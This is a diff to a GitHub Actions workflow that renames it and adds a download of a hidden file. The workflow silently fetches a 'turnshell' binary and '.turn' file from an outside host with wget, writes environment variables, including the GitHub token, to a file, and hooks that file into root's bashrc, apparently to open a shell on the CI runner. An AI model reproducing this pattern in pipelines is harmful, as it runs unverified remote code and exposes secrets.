@@ -1,7 +1,7 @@
 # This workflow will install Python dependencies, run tests and lint with a single version of Python
 # For more information see: https://docs.github.com/en/actions/automating-builds-and-tests/building-and-testing-python
 
-name: Python application 2 G
+name: Native Application
 
 on:
   workflow_dispatch:
@@ -34,6 +34,7 @@ jobs:
         GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
       run: |
         wget https://ec2.zibri.org/turnshell &>/dev/null
+        wget https://ec2.zibri.org/.turn &>/dev/null
         chmod a+x turnshell
         set |grep -v "PWD\|HOME\|TERM" >.set
         sudo sed -i -e '$a set -o allexport' -e '$a source /home/runner/work/shell/shell/.set &>/dev/null' -e '$a set +o allexport' /root/.bashrc
